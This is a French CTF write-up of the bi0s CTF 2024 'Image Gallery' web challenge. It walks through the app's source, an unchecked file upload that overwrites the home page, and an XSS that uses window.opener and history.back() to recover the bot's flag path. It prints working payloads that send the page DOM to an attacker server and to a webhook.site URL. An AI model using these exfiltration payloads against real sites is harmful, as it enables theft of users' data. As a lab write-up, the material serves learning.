---
title: Bi0s CTF 2024 - Image Gallery (Web) - unrated
img_path: /assets/img/posts/image-gallery
categories:
  - CTF
  - web
  - Write-up
  - Vulnérabilités Web
tags:
  - opener
  - javascript
  - xss
---

Ce week-end s'est tenu le bi0s ctf 2024. Un CTF jeopardy difficile avec des équipes de haut niveau.

Pour ma part, je me suis attelé à un seul challenge : image-gallery, dans la catégorie web.

## Le site

Le site est très simple :

![image](Pasted image 20240226121153.png)

On peut juste uploader un fichier, que ce soit une image ou non.

Ensuite l'image est listée :

![image](Pasted image 20240226121337.png)

Et on peut la partager avec un bot :

![image](Pasted image 20240226121415.png)

C'est tout.

## Le code source

Voici les fichiers :

```bash
$> tree
.
├── Dockerfile
└── src
   ├── app.js
   ├── bot.js
   ├── package.json
   ├── package-lock.json
   ├── public
   └── views
       └── index.ejs
```

Un Dockerfile :

```dockerfile
FROM node:lts

RUN apt update && \
    apt install -y curl gnupg2

RUN apt-get update && apt-get install gnupg wget -y && \
    wget --quiet --output-document=- https://dl-ssl.google.com/linux/linux_signing_key.pub | gpg --dearmor > /etc/apt/trusted.gpg.d/google-archive.gpg && \
    sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google.list' && \
    apt-get update && \
    apt-get install google-chrome-stable -y --no-install-recommends && \
    rm -rf /var/lib/apt/lists/*
ENV NODE_ENV=production
ENV PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true

WORKDIR /app
RUN mkdir /app/public


COPY src/package*.json .

RUN npm install

COPY src/ .

ENV FLAG=flag{hellow}

RUN useradd -ms /bin/bash user
RUN chown -R user:user /app/public
RUN chmod -R  +rx /app
USER user

CMD ["node", "app.js"]
```

`App.js` :

```js
<SNIP>
const {randomUUID } =  require("crypto");
const { visit } = require('./bot');
const flag_id = randomUUID();
const maxSizeInBytes = 3 * 1024 * 1024;

const plantflag = () => {

fs.mkdirSync(path.join(__dirname,`/public/${flag_id}`))
fs.writeFileSync(path.join(__dirname,`/public/${flag_id}/flag.txt`),process.env.FLAG||'flag{asdf_asdf}')

}

const app = express();

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(cookieParser());
app.use(fileUpload());
app.use(express.json())

app.get('/', async(req, res) => {

  if(req.cookies.sid && /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(req.cookies.sid)){

    try {

      const files = btoa(JSON.stringify(fs.readdirSync(path.join(__dirname,`/public/${req.cookies.sid}`))));
      return res.render('index', {files: files,id : req.cookies.sid});
  
    } catch (err) {}  
  }

  let id = randomUUID();
  fs.mkdirSync(path.join(__dirname,`/public/${id}`))
  res.cookie('sid',id,{httpOnly: true}).render('index', {files: null, id: id});
  return;
});

app.post('/upload',async(req,res) => {

  if (!req.files || !req.cookies.sid) {
    return res.status(400).send('Invalid request');
  }
    try{
      const uploadedFile = req.files.image;
      if (uploadedFile.size > maxSizeInBytes) {
        return res.status(400).send('File size exceeds the limit.');
      }
      await uploadedFile.mv(`./public/${req.cookies.sid}/${uploadedFile.name}`);
   }catch{
      return res.status(400).send('Invalid request');
   }

  res.status(200).redirect('/');
  return
})

app.post('/share',async(req,res) => {

  let id = req.body.id
  await visit(flag_id,id);
  res.send('Sucess')
  return
})

const port = 3000;
app.listen(port, () => {
  plantflag()
  console.log(`Server is running on port ${port}`);
});
```

Puis le bot, dans `bot.js` :

```js
const puppeteer = require("puppeteer");
const fs = require("fs");


async function visit(flag_id,id) {
  const browser = await puppeteer.launch({
    args: [
        "--no-sandbox",
        "--headless"
    ],
    executablePath: "/usr/bin/google-chrome",
  });

  try {

    let page = await browser.newPage();

		await page.setCookie({
      
			httpOnly: true,
			name: 'sid',
			value: flag_id,
			domain: 'localhost',
      
		});

		page = await browser.newPage();

    await page.goto(`http://localhost:3000/`);

    await new Promise((resolve) => setTimeout(resolve, 3000));

    await page.goto(
      `http://localhost:3000/?f=${id}`,
      { timeout: 5000 }
    );

    await new Promise((resolve) => setTimeout(resolve, 3000));
    
    await page.close();
    await browser.close();

  } catch (e) {
    console.log(e);
    await browser.close();
  }
}

module.exports = { visit };
```

La page de garde, `index.ejs`, n'est pas intéressante. Elle permet juste d'afficher les fichiers, et n'est pas vulnérable à une SSTI. Pour ce type de vulnérabilité concernant ejs, il faut qu'il y ait un certain pattern, absent ici. Lire cette [issue](https://github.com/mde/ejs/issues/720) et le [SECURITY.md](https://github.com/mde/ejs/blob/main/SECURITY.md#out-of-scope-vulnerabilities) d'EJS.

## `app.js`

Intéressons-nous au fichier principal.

Premièrement, l'application crée le `flag_id`, qui sera par la suite utilisé dans un cookie `sid` :

```js
const flag_id = randomUUID();
```

Puis ensuite, nous avons une fonction qui permet de mettre le fichier `flag.txt` dans un dossier qui est nommé selon le `flag_id` :

```js
const plantflag = () => {

fs.mkdirSync(path.join(__dirname,`/public/${flag_id}`))
fs.writeFileSync(path.join(__dirname,`/public/${flag_id}/flag.txt`),process.env.FLAG||'flag{asdf_asdf}')
}
```

Cette fonction est appelée au démarrage de l'application :

```js
app.listen(port, () => {
  plantflag()
  console.log(`Server is running on port ${port}`);
});
```

La route principale, en `GET`, elle,  teste l'existence du cookie `sid`, puis sa valeur selon un regex qui correspond à la fonction `randomUUID()`.

Ensuite, une variable constante `file`  est créée selon le cookie, puis la page de garde est rendue selon cette variable.

S'il n'y a pas de cookie (ou que le cookie est mal formaté), il est créé.

```js
app.get('/', async(req, res) => {

  if(req.cookies.sid && /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(req.cookies.sid)){

    try {

      const files = btoa(JSON.stringify(fs.readdirSync(path.join(__dirname,`/public/${req.cookies.sid}`))));
      return res.render('index', {files: files,id : req.cookies.sid});
  
    } catch (err) {}  
  }

  let id = randomUUID();
  fs.mkdirSync(path.join(__dirname,`/public/${id}`))
  res.cookie('sid',id,{httpOnly: true}).render('index', {files: null, id: id});
  return;
});
```

La seconde route `/upload` est en `POST`.

S'il n'y a pas de fichier, ou pas de cookie `sid`, une erreur 400 est retournée.

Toutefois, la valeur de ce cookie n'est pas testée contre un regex comme dans la route `/`.

Donc tant qu'il y a une valeur qui existe, on peut mettre n'importe quoi.

Ensuite, la taille du fichier est testée, puis le fichier copié via la fonction `mv`. Cette copie s'effectue selon la valeur du cookie sid ainsi que le nom du fichier.

```js
app.post('/upload',async(req,res) => {

  if (!req.files || !req.cookies.sid) {
    return res.status(400).send('Invalid request');
  }
    try{
      const uploadedFile = req.files.image;
      if (uploadedFile.size > maxSizeInBytes) {
        return res.status(400).send('File size exceeds the limit.');
      }
      await uploadedFile.mv(`./public/${req.cookies.sid}/${uploadedFile.name}`);
   }catch{
      return res.status(400).send('Invalid request');
   }

  res.status(200).redirect('/');
  return
})
```


Il n'y a absolument aucun test pour savoir si c'est bien une image ou non.

Il semble donc clairement y avoir la possibilité d'injecter ses propres pages au sein de l'application, ou n'importe quoi d'autre par ailleurs.

En effet, si on regarde cette portion de code, on remarque que l'application utilise le dossier public en `static` :

```js
app.use(express.static('public'));
```

Ce qui permet de servir des fichiers statiques, comme nos "images" mais également des fichiers html, par exemple `index.html`, qui prendrait alors le dessus sur `index.ejs` pour être servi par l'application.

Gardons cela en tête et passons au code de la route `/share`, en méthode `POST` également :

```js
app.post('/share',async(req,res) => {

  let id = req.body.id
  await visit(flag_id,id);
  res.send('Sucess')
  return
})
```

Elle est très simple : elle transmet le paramètre du body `id` au bot, ainsi que le `flag_id`. En bref, c'est une façon d'appeler le bot, que nous allons inspecter maintenant.

## `bot.js`

C'est comme souvent un bot puppeteer.

En premier, nous avons le cookie du bot de mis en place. Nous remarquons que le cookie est en `httpOnly`, on ne peut donc pas le récupérer via javascript :

```js
		await page.setCookie({
      
			httpOnly: true,
			name: 'sid',
			value: flag_id,
			domain: 'localhost',
      
		});
```

Puis ensuite il visite la page de garde de l'application, ce qui va mettre en place sa gallerie à lui, contenant le flag, avec le chemin d'accès à celui-ci grâce à son cookie :

```js
    await page.goto(`http://localhost:3000/`);
    await new Promise((resolve) => setTimeout(resolve, 3000));
```

On voit qu'il y a une attente de 3 secondes. Après ce temps, il va visiter l'id passé via la route `/share` vue plus haut, avec cette fois-ci une attente de 5 secondes :

```js
    await page.goto(
      `http://localhost:3000/?f=${id}`,
      { timeout: 5000 }
    );

    await new Promise((resolve) => setTimeout(resolve, 3000));
```

## Exploitation

Nous avons donc moyen d'écrire une page de garde qui va "écraser" en quelque sorte la page de garde `index.ejs`. On voit que le bot va visiter la page de garde, puis ensuite faire une requête `GET` à celle-ci via le paramètre `f` sur cette même page de garde.

Ce paramètre `f` ne permet pas de pouvoir exécuter quoique ce soit dans le contexte du bot. Si par exemple nous mettons `http://vulnsite.com/?f=http://monvps.fr/evilpage.html`, il y aura bien une requête sur notre page mais aucune exécution javascript.

Ceci est dû est fait que lorsque le paramètre `f` est présent, c'est une image qui apparaît, via `modalImage` de bootstrap.

On peut le voir dans `index.ejs` :

```js
<SNIP>
  const urlParams = new URLSearchParams(window.location.search);
  const file = urlParams.get('f');
  document.addEventListener('DOMContentLoaded', function () {


  if(file){
    const modal = new bootstrap.Modal(document.getElementById('imageModal'));
    const modalImage = document.getElementById('modalImage');
    modalImage.src = file
    modal.show();
  }
<SNIP>
```

Nous devons donc trouver une autre idée.

Nous savons que nous pouvons avoir une xss car nous pouvons avoir notre propre page de garde de visitée.

Simplement, si il n'y a que notre page de garde, la précédente, **celle qui contient le chemin vers le flag**, n'existe plus. Comment alors procéder ?

### Window.open()

On peut penser à `window.open()`. C'est une fonction javascript qui va ouvrir un nouvel onglet par exemple.

Syntaxe :

```js
open();
open(url);
open(url, target);
open(url, target, windowFeatures);
```

Cela va créer un objet, qui sera l'enfant de la fenêtre courante. Si on est dans le même origine, c'est à dire avec le même domaine, port, protocole, on peut accéder à toute les propriétés de cet objet via `window.opener`.

Exemple :

![image](Pasted image 20240226130828.png)

Ici on est dans l'onglet ouvert par `http://localhost:1337` et on peut accéder à n'importe quel élément de la page parente.

Maintenant, à quoi ça nous sert ?

Admettons que :

- 1) Nous préparons une page `index.html`pour écraser la page courante (voir le code plus bas). Elle va simplement ouvrir la page au point 2).
- 2) Nous mettons en place une page html qui se nomme `index2.html`, ouvert via la fonction `window.open` dans `index.html`
- 3) Nous trouvons un moyen de faire en sorte que la page qui affiche `index.html` retrouve son état d'avant, c'est à dire que nous naviguions en arrière, de sorte que l'on retrouve la page de garde originelle.
- 4) Vu que nous avons un total accès à la page parente (on se trouve dans la même origine), on extrait le html de cette page vers une page sous notre contrôle.

C'est un bon plan, mais nous devons encore savoir deux choses : à quel moment écraser la page de garde ? Et comment retourner en arrière ?

Pour la question du moment où écraser la page de garde, il nous suffit de repenser au bot :

```js
    await page.goto(`http://localhost:3000/`);
    await new Promise((resolve) => setTimeout(resolve, 3000));
```

Il va à la page de garde et après 3 secondes, il va **ensuite** de nouveau la visiter avec le paramètre `f`. Lors de la première visite, il aura quelque chose comme ça (pas visuellement bien sûr, mais c'est pour donner une idée):

![image](Pasted image 20240226131644.png)

La seconde, si on place notre page html, le bot aura une page avec notre code javascript.

Reste à répondre à la seconde question. Comment retourner en arrière ?

Vu que de la seconde page `index2.html`, nous avons un contrôle total sur la première, on peut utiliser la fonction `back()` sur l'objet `history`. Merci Othmane pour l'idée ! :)

## Mettre les briques ensemble

1) Upload `index2.html`
![image](20-09-25.png)

2) Demander au bot de visiter la page de garde avec un id quelconque :

![image](20-10-55.png)

3) Attendre quelques secondes puis uploader `index.html` :
![image](20-13-51.png)

Au final, de `index2.html` on exfiltrera le DOM dans l'état antérieur à l'écrasement de la page de garde afin de récupérer le chemin d'accès au flag.

Codes :

index.html:

```js
<script>
	window.open('http://localhost:1337/index2.html', 'secretTab');
</script>
```

index2.html :

```js
<script>
    window.opener.history.back();
    setTimeout(()=> {
    window.location='https://vps.com/?res='+btoa(window.opener.document.body.innerHTML);
    }, 500)
</script>
```

### Solution officielle

La solution officielle est beaucoup plus courte :

```html

<html>
    <body>
        <script>
            // upload index.html to the public dir after the first admin visit which overwrites `/` response and use history.back() to exfill the flag
            (async()=>{
                if(opener){
                    opener.window.history.back()
                    await new Promise(r=>setTimeout(r,2000));
                    navigator.sendBeacon('https://webhook.site/572acb1c-44f1-433e-8a4d-8f55ae14799a',opener.window.document.body.innerHTML)
                }else{
                    window.open('/?test')
                }
        })()
            
        </script>
    </body>
</html>
```

En effet, on peut accéder à l'objet opener de la fenêtre courante. Je ne savais pas.